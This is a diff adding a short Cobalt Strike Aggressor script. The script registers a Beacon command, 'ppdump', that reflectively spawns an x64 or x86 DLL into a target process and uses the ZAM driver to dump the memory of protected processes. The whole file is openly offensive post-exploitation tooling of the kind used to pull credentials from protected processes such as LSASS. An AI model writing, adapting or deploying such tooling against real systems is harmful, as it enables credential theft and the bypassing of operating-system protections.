@@ -1,0 +1,13 @@
+alias ppdump {
+	if ( -is64 $1 ){
+			$bdll = script_resource("ppdump.x64.dll");
+	} else {
+			$bdll = script_resource("ppdump.x86.dll");
+	}
+	bdllspawn($1, $bdll, pack('i-', $2), "Protected Process (Light) Dump", 0, false);
+};
+
+beacon_command_register(
+	"ppdump",
+	"Dump Protected Process Memory Using ZAM Driver",
+	"Synopsis: ppdump [pid]\n\nAcquire a handle to a target process using a driver and dump its memory");
